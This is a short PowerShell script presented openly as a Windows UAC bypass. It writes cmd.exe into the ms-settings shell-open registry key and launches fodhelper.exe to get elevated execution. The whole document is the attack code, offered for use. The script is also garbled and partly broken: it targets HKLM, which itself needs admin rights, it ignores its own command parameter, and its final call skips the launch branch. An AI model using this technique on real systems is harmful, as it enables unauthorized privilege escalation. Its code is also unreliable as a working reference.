function invoke-UAC-Bypassing {

<#
 Author   @matthomjxi0e
 
 Licence  Powershell Not More
 
 Optional Dependencies None


.Synopsis
this lllustrates operations Bypassing UAC using Storage new in HKLM On Registry
every this Comes precisely from this location this => Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Classes\ms-settings\Shell\Open


.Description
 This is Operation, I Knew this Her using IDA ! FOr Operation Storage program Fodhelper in ( HKLM ) Only 
 using Method invoke the Executeion in commands in Fodhelper.exe /regserver With /Open 


.Example
PS:> invoke-UAC-Bypassing -CommandEx cmd.exe

#>

    [CmdletBinding(SupportsPaging = $true)]    
    param( 
            [Parameter(Mandatory=$True,Position=0)]

                [parameter(Mandatory=$true,ParameterSetName="NULL")]
   
            [System.String]$CommandEx,$Stack
)

$EnableAccessStorage = (

  $EnableAccessStorage = fodhelper.exe /RegServer
)

 reg add HKLM\SOFTWARE\Classes\ms-settings\Shell\Open\Command /t REG_SZ /d cmd.exe
 sleep 5
   $Verbose = (
        Write-Host -Object "[*] Operation Access in Storage Program FR SYS" -ForegroundColor Yellow
 )
  """"
  sleep 1
   $Verbose2 = (
        Write-Host -Object "[*] Operation Access For Execute FR TESTING EX " -ForegroundColor Yellow
  )
   sleep 1
   """"
   sleep 1
    $Verbose3 = (
   Write-Host -Object "[*] Operation THE Executeion in Location Ex Program " -ForegroundColor Yellow
  )
  sleep 1
 $JoinExecution =  

 if ($CommandEx -like "NULL") {

     $AccessAgain = fodhelper.exe /open
} 

}
invoke-UAC-Bypassing Test
